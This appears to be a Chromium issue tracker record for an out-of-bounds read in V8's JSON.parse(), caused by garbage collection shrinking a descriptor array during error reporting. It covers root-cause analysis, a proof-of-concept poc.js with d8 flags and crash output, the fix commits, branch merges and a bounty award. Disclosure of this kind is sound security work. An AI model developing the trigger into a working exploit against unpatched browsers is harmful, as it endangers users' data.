# JSON.parse(): Out-of-bounds access on DescriptorArray

| Field | Value |
|-------|-------|
| **Issue ID** | [469143679](https://issues.chromium.org/issues/469143679) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | pt...@chromium.org |
| **Created** | 2025-12-16 |
| **Bounty** | $4,000.00 |

## Description

VULNERABILITY DETAILS

This is an issue similar to `issues/423459708`, and the previous fix was incomplete. The problem also occurs in `ParseJsonObjectProperties()`, which is a method used to parse the keys and values of all fields in an object.

`ParseJsonObjectProperties()` has three implementation paths: `kJsonSlow`, `kJsonFast`, and `kJsonUnknown`. If an object of a certain `Map` is being serialized for the first time, it will enter the `kJsonUnknown` path.

```
template <typename Char>
template <DescriptorArray::FastIterableState fast_iterable_state>
bool JsonParser<Char>::ParseJsonObjectProperties(
    JsonContinuation* cont, MessageTemplate first_token_msg,
    Handle<DescriptorArray> descriptors) {
  using FastIterableState = DescriptorArray::FastIterableState;
  if constexpr (fast_iterable_state == FastIterableState::kJsonSlow) {
    ...
  } else {
    InternalIndex idx{0};
    do {
      EXPECT_NEXT_RETURN_ON_ERROR(JsonToken::STRING, first_token_msg, false);
      first_token_msg = MessageTemplate::kJsonParseExpectedDoubleQuotedPropertyName;
      bool key_match;
      if constexpr (fast_iterable_state == FastIterableState::kJsonFast) {
        ...
      } else {    // Unknown
        // Parse a string from json as the field name.
        JsonString key = ScanJsonPropertyKey(cont);
        ...

        Tagged<Name> property_name = descriptors->GetKey(idx);
        bool is_slow = key.has_escape();
        // Check that the property is enumerable and located in field.
        PropertyDetails details = descriptors->GetDetails(idx);
        if (V8_UNLIKELY(details.IsDontEnum() ||
                        details.location() != PropertyLocation::kField)) {
          is_slow = true;
        }
        // Symbol property keys are slow.
        if (V8_UNLIKELY(IsSymbol(property_name))) {
          is_slow = true;
        }

        // Check if the field name in the JSON matches the property name in the descriptor array.
        key_match = false;
        if (V8_LIKELY(!is_slow)) {
          DisallowGarbageCollection no_gc;
          // Property key is known to be fast so far, so it is guaranteed to
          // be a string.
          Tagged<String> expected_key = Cast<String>(property_name);
          Tagged<Map> key_map = expected_key->map();
          if (InstanceTypeChecker::IsTwoByteString(key_map)) {
            // Two-byte keys are slow.
            is_slow = true;
          } else {
            const uint8_t* expected_chars = GetFastKeyChars(isolate_, expected_key, key_map, no_gc);
            const uint32_t key_length = expected_key->length();
            key_match = FastKeyMatch(expected_chars, key_length, key);
          }
        }

        if (V8_UNLIKELY(is_slow)) {
          descriptors->set_fast_iterable(FastIterableState::kJsonSlow);
        }

       if (V8_UNLIKELY(!ParseJsonPropertyValue(key))) return false;

        if (V8_UNLIKELY(is_slow || !key_match)) {
            ...
        }
        ++idx;
      }
    } while (idx < InternalIndex(descriptors->number_of_descriptors()) && Check<JsonToken::COMMA>());
    ...
  }

  return true;
}

```

The cause of the previous issue (`issues/423459708`) was:

- Before entering the do-while loop, the function pre-saved `descriptors->number_of_descriptors()` into a variable `descriptors_end`.
- When calling `ParseJsonPropertyValue()` to parse a field value, memory is allocated, which triggers a GC and causes the descriptors array to shrink.
- Since `idx < descriptors_end`, the loop continues, leading to an OOB access when executing `descriptors->GetDetails(idx)`.

This issue is similar. `ScanJsonPropertyKey()` is responsible for parsing a string from the JSON. However, when processing `"B`, because it is not a complete string, it enters `ReportUnexpectedToken()` to generate an error message and throw an exception.
Note: GC is allowed when executing `ReportUnexpectedToken()`, so a GC can be triggered during the error message generation process, causing the `descriptors` to shrink.

```
template <typename Char>
JsonString JsonParser<Char>::ScanJsonString(bool needs_internalization) {
  DisallowGarbageCollection no_gc;
  ...

  while (true) {
    ...
    if (V8_UNLIKELY(is_at_end())) {
      AllowGarbageCollection allow_before_exception;
      ReportUnexpectedToken(JsonToken::ILLEGAL,
                            MessageTemplate::kJsonParseUnterminatedString);
      break;
    }
    ...
  }
  return JsonString();
}

```

Therefore, during the execution of the PoC, the `ParseJsonArray()` execution process is as follows:

First, the object corresponding to `{"A": 0}` is parsed, and `MapA` is obtained as feedback. Note: `feedback->descriptors` has two entries.

Then, `ParseJsonValueRecursive(feedback)` is called to parse the subsequent object, which will then call `ParseJsonObjectProperties()` to parse the two fields in `{"A": 0,"B`.

1. After parsing the first field `"A": 0`, the do-while loop check is performed: `idx=1, descriptors->number_of_descriptors()=2`, so the loop continues.
2. When parsing the second field "B:
   1. `ScanJsonPropertyKey()` is called to parse a string, which in turn calls `ScanJsonString()`.
      1. Since `"B` is not a complete string object, `ReportUnexpectedToken()` is called to report an error.
      2. During the error reporting, memory is allocated, triggering a GC, which causes the `descriptors` to shrink.
      3. An empty string `JsonString()` is returned.
   2. The do-while loop does not handle the error from `ScanJsonString()` and continues to execute `descriptors->GetKey(idx)`. At this point, descriptors has only one entry, while `idx=1`, leading to an out-of-bounds access.

I believe the root cause is the incomplete handling of `ScanJsonPropertyKey()` failure. If `ScanJsonPropertyKey()` returns an empty string, the loop should stop immediately.

The problematic code was introduced in commit `5fdab0114d1211e11bce1c74b40fc5e57b4942e6`, which attempted to fix `issues/423459708` but was unsuccessful.

REPRODUCTION CASE

poc.js:

```
// Incomplete JSON, JSON.parse() will throw an exception when handling `"B`
const jsonStr = `
[
    {
        "A": 0
    },
    {
        "A": 0,
        "B
`;

// prepare map transition: MapA --add-property(B)--> MapB
// MapA and MapB shared same descriptors
let o1 = {A: 0};    // own 1 entry
let o2 = {A: 0};    // own 2 entry
o2.B = 1;

// %DebugPrint(o1);

// clear reference, no objects use MapB, 
// so only one entry in MapA->descriptors is actually used, and it will shrink during GC.
o2 = null;

// trigger GC to shrink descriptors array in `ReportUnexpectedToken()`
%SetAllocationTimeout(-1, 5);

// trigger crash
try {
    JSON.parse(jsonStr);
} catch(e) {
}

```

V8 must be built with a debug configuration, Execute v8 as follows:

```
./d8 \
    --allow-natives-syntax \
    --predictable \
    --predictable-gc-schedule \
    ./poc.js

```

This will result in the following crash:

```
#
# Fatal error in ../../src/objects/descriptor-array-inl.h, line 231
# Debug check failed: descriptor_number.as_int() < number_of_descriptors() (1 vs. 1).
#

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### ch...@google.com (2025-12-16)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2025-12-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5815709133111296.

### jd...@chromium.org (2025-12-16)

While I can't get ClusterFuzz to reproduce this, I can pretty straightforwardly, so I'm conservatively setting all fields to match [crbug.com/423459708](https://crbug.com/423459708).

ptheir@, since you owned that fix, would you mind taking a look here? Thanks!

### ch...@google.com (2025-12-17)

Setting milestone because of s2 severity.

### ch...@google.com (2025-12-17)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### pt...@chromium.org (2025-12-18)

Thanks for the report. This was indeed missed.

### dx...@google.com (2025-12-18)

Project: v8/v8  

Branch:  main  

Author:  pthier [pthier@chromium.org](mailto:pthier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7274717>

[json] Parser: Ensure descriptor array access is in bounds

---


Expand for full commit details
```
     
    A GC could shrink the descriptor array. Ensure that we early break the 
    loop on all paths to prevent reading beyond the limit. 
     
    Fixed: 469143679 
    Change-Id: I9ac5851ffd9454ad13302171d45349d3fb73786a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7274717 
    Commit-Queue: Patrick Thier <pthier@chromium.org> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104407}

```

---

Files:

- M `src/json/json-parser.cc`

---

Hash: [c30fe0dc4475926fd74ca20a9bfc510a658bc0e5](https://chromiumdash.appspot.com/commit/c30fe0dc4475926fd74ca20a9bfc510a658bc0e5)  

Date: Thu Dec 18 11:56:22 2025


---

### dx...@google.com (2025-12-18)

[Details redacted due to bug visibility]

Change-Id: I2717cd2fc725ffdb2bcd12f39fbceabdf415abae
https://chrome-internal-review.git.corp.google.com/8861256


### ch...@google.com (2025-12-18)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2025-12-18)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2025-12-19)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2025-12-19)

Merge review required: M144 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2025-12-29)

Merge approved. This is a medium severity security bug with a simple fix and no indications of stability impact.

### ch...@google.com (2026-01-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### go...@google.com (2026-01-05)

Please merge your change to M144 by 10:00 AM PT tomorrow, Jan 6th so we can take it in for M144 Early Stable release on Wednesday, Jan 7th.  Thank you.

### go...@google.com (2026-01-05)

[Bulk Edit]

Please merge to M144 by 10:00 AM PT tomorrow, Jan 6th so we can take it in for M144 Early Stable RC cut.

If it is already merged to M144 and nothing pending, please mark the bug as fixed. 

### ch...@google.com (2026-01-06)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-01-07)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  pthier [pthier@chromium.org](mailto:pthier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7361936>

Merged: [json] Parser: Ensure descriptor array access is in bounds

---


Expand for full commit details
```
     
    A GC could shrink the descriptor array. Ensure that we early break the 
    loop on all paths to prevent reading beyond the limit. 
     
    Fixed: 469143679 
    (cherry picked from commit c30fe0dc4475926fd74ca20a9bfc510a658bc0e5) 
     
    Change-Id: I19c4a3f0066e5b3ddd5fe4d1588cbec056645d3b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7361936 
    Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Auto-Submit: Patrick Thier <pthier@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#32} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/json/json-parser.cc`

---

Hash: [2ebb924f4a51ec8022c1413775fc2e41736cc1a6](https://chromiumdash.appspot.com/commit/2ebb924f4a51ec8022c1413775fc2e41736cc1a6)  

Date: Thu Dec 18 11:56:22 2025


---

### sp...@google.com (2026-01-09)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $4000.00 for this report.

Rationale for this decision:
$3,000 for a high quality report of OOB read / user information disclosure + $1,000 bisect bonus


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### sr...@chromium.org (2026-01-15)

Please help complete all your merges before 2pm PST on friday Jan 16, so they can be part of the respin next week , with monday being a holiday we want to get everything complete by Friday . Please reach out to me if you cannot complete the merges and need help

### pe...@google.com (2026-01-15)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pt...@chromium.org (2026-01-21)

Answers to [comment #22](https://issues.chromium.org/issues/469143679#comment22)

> 1. Was this issue a regression for the milestone it was found in?

Yes (issue introduced in M138)

> 2. Is this issue related to a change or feature merged after the latest LTS Milestone?

Yes (issue introduced in M138)

### pe...@google.com (2026-01-22)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### pt...@chromium.org (2026-01-22)

> Number of CLs needed for this fix and links to them.

1 (<https://chromium-review.googlesource.com/c/v8/v8/+/7488491>)

> Level of complexity (High, Medium, Low - Explain)

Low. Trivial CL with just 1 branch added for early exit.

> Has this been merged to a stable release? beta release?

Yes. Merged to M144 (stable).

> Overall Recommendation (Yes, No)

Yes.

### an...@google.com (2026-01-23)

Waiting for M144 Stable promotion next week

### pe...@google.com (2026-01-30)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-01-30)

The questions were already answered by [comment #25](https://issues.chromium.org/issues/469143679#comment25).

### an...@google.com (2026-01-30)

Approved for LTS-138

### dx...@google.com (2026-02-03)

Project: v8/v8  

Branch:  refs/branch-heads/13.8  

Author:  pthier [pthier@chromium.org](mailto:pthier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7488491>

[M138-LTS][json] Parser: Ensure descriptor array access is in bounds

---


Expand for full commit details
```
     
    A GC could shrink the descriptor array. Ensure that we early break the 
    loop on all paths to prevent reading beyond the limit. 
     
    Fixed: 469143679 
    Change-Id: I9ac5851ffd9454ad13302171d45349d3fb73786a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7274717 
    Commit-Queue: Patrick Thier <pthier@chromium.org> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#104407} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7488491 
    Reviewed-by: Patrick Thier <pthier@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/13.8@{#92} 
    Cr-Branched-From: 61ddd471ece346840bbebbb308dceb4b4ce31b28-refs/heads/13.8.258@{#1} 
    Cr-Branched-From: fdb5de2c741658e94944f2ec1218530e98601c23-refs/heads/main@{#100480}

```

---

Files:

- M `src/json/json-parser.cc`

---

Hash: [f29abbb8e02530af79f053fdbf7b61c00dab00bf](https://chromiumdash.appspot.com/commit/f29abbb8e02530af79f053fdbf7b61c00dab00bf)  

Date: Thu Dec 18 11:56:22 2025


---

### ch...@google.com (2026-03-27)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> $3,000 for a high quality report of OOB read / user information disclosure + $1,000 bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/469143679)*
